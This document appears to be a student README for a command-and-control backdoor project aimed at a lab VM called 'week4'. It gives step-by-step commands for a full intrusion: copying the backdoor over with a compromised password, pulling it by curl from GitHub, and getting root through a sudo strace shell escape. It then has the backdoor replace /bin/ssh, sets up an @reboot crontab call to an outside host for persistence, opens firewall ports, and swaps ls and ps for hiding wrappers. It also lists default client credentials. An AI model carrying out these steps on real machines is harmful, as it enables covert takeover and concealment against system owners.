# C2 Project - John R. Smith
## Build Instructions
This project relies on the tiny-aes library. Those dependencies are located in the /tiny-aes directory. Build them by going into that directory and running make.
Once that is compiled, go into the src directory and run make as well. This will compile the backdoor binary for the week4 machine.
*If you want to compile the wrapper files, you can do so using gcc and the following arguments for execution on the legacy week4 linux version*:
`--std=gnu99 -static -static-libgcc -static-libstdc++` 
### Backdoor Installation
#### Required files
To install the backdoor, you must place the following files from this directory onto the victim machine. For the week4 VM, this can easily be done using SCP and the compromised user password (hill).
- `example_key`: for AES authentication, you can modify this to use a different key and IV
- `backdoor` (binary): the remote shell
<br>You can also use curl to dynamically pull the latest binary from the GitHub: `curl -L https://github.com/jrsmith03/c2/releases/tag/c2/backdoor`
#### Modifications to the system
1. Obtain root access via the simplest exploit: entering the command `sudo strace -o /dev/null /bin/sh`
2. Overwrite the system's SSH client with the `backdoor` binary - `mv backdoor /bin/ssh`
3. Modify the crontab to allow for remote connections and persistance: 
    - Enter `crontab -e` and add the line `@reboot ssh user@contoso.org`
    - Optional: You may need to disable the firewall service with `@reboot sudo strace -o /dev/null /bin/sh` if modifications to the firewall don't work.
4. Modify the firewall to allow connections on a range of ports: `firewall-cmd --zone=public --add-port=1338/tcp --permanent`
    - *Note: you'll want to ports on the range that you specified when you configured the backdoor arguments*
#### *Optional changes for better hiding*
5. Replace `ls` with the wrapper binary via `mv /bin/ls /bin/oldls; mv ls_w /bin/ls`. Repeat for `ps`
#### 
## Configuration & Manual
Once the backdoor is configured properly, no more direct interaction with the victim (week4) machine is needed. As specified in the writeup, the backdoored machine accepts client connections via TCP sockets. Subsequently, you must point the *c2 client* at the *backdoor machine* in order for it to recieve commands. This configuration is done via arguments to allow for maximum flexibility.
The arguments are as follows: `./client <server_ip> <server_port> <user> <password> <number of retries>`, where
- user and password are by default 'user' and 'password'. This can be modified in the source `(backdoor.c)`.
- The default port for the backdoor is 1337, however this can be changed via optional command line arguments *to the backdoor* (see above)
- If you change the AES key or IV, client expects the file `example_key` located in the same directory as the binary; backdoor expects the file `id_rsa` located in `/root/.ssh/id_rsa`
